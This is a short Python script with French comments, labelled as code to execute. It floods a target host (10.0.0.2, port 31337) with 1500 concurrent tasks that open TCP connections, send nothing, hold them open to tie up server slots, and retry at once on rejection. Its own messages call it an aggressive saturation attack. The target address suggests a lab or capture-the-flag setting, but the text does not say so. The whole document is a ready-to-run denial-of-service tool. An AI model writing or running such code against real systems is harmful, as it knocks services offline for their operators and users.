#---------------------------code a exectuer----------------------------------
import asyncio

TARGET_IP = "10.0.0.2"
TARGET_PORT = 31337
CONCURRENCY = 1500  # Nombre maximal de connexions simultanées souvent à 1024 ou 4096 

async def aggressive_flood():
    while True:
        try:
            # Ouvrir la connexion sans envoyer de données pour forcer le serveur à bloquer sur recv
            reader, writer = await asyncio.open_connection(TARGET_IP, TARGET_PORT)
            # Maintenir la socket ouverte pour monopoliser un processus / emplacement
            await asyncio.sleep(1.5)
            writer.close()
            await writer.wait_closed()
        except Exception:
            # Réessayer instantanément en cas de saturation ou de rejet
            await asyncio.sleep(0.001)

async def main():
    print(f"[*] Saturation agressive de {TARGET_IP}:{TARGET_PORT} avec {CONCURRENCY} tâches...")
    tasks = [aggressive_flood() for _ in range(CONCURRENCY)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Arrêt de l'attaque.")
